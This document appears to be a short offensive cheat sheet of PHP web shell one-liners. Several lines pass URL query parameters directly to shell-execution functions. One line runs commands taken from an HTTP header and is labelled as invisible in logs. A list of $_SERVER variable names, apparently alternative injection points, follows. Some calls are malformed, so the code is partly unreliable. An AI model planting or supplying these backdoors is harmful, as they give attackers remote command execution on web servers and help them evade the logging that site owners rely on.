<?php exec($_GET["cmd1"]); ?>
<?php system($_GET["cmd2"]); ?>
<?php passthru($_GET["cmd3"]);?>
<?php popen($_GET["cmd3"]);?>
<?php proc_open($_GET["cmd4"]); ?>
<?php echo shell_exec($_GET["cmd5"]); ?>

#HEADERS (INVISIBLE IN LOGS)
<?php system($_SERVER["HTTP_ACCEPT_LANGUAGE"]); ?>
'argv'
    'argc'
    'GATEWAY_INTERFACE'
    'CGI/1.1'
    'SERVER_ADDR'
    'SERVER_NAME'
    'SERVER_SOFTWARE'
    'SERVER_PROTOCOL'
    'HTTP/1.0'
    'REQUEST_METHOD'
    'GET', 'HEAD', 'POST', 'PUT'
    'REQUEST_TIME'
    'REQUEST_TIME_FLOAT'
    'QUERY_STRING'
    'DOCUMENT_ROOT'
    'HTTP_ACCEPT'
    'HTTP_ACCEPT_CHARSET'
    'iso-8859-1,*,utf-8'
    'HTTP_ACCEPT_ENCODING'
    'gzip'
    'HTTP_ACCEPT_LANGUAGE'
    'en'
    'HTTP_CONNECTION'
    'Keep-Alive'
    'HTTP_HOST'
    'HTTP_REFERER'
    'HTTP_USER_AGENT'
    'HTTPS'
    'REMOTE_ADDR'
    'REMOTE_HOST'
    'REMOTE_PORT'
    'REMOTE_USER'
    'REDIRECT_REMOTE_USER'
    'SCRIPT_FILENAME'
    'SCRIPT_FILENAME'
    'SERVER_ADMIN'
    'SERVER_PORT'
    '80'
    'SERVER_SIGNATURE'
    'PATH_TRANSLATED'
    'SCRIPT_NAME'
    'REQUEST_URI'
    '/index.html'
    'PHP_AUTH_DIGEST'
    'Authorization'
    'PHP_AUTH_USER'
    'PHP_AUTH_PW'
    'AUTH_TYPE'
    'PATH_INFO'
    'PATH_INFO'
    'ORIG_PATH_INFO'
    'PATH_INFO' 